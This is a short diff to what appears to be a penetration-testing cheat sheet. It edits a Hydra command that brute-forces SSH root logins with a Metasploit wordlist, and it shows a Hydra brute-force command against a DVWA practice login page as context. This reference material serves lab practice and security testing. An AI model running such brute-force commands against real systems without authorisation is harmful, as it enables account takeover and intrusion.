@@ -100,7 +100,7 @@ hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login
 ```
 ### ssh
 ```sh
-hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.123
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.123 -t 4
 ```
 # Header Fuzzing and Manipulation
 ## Fetch Header
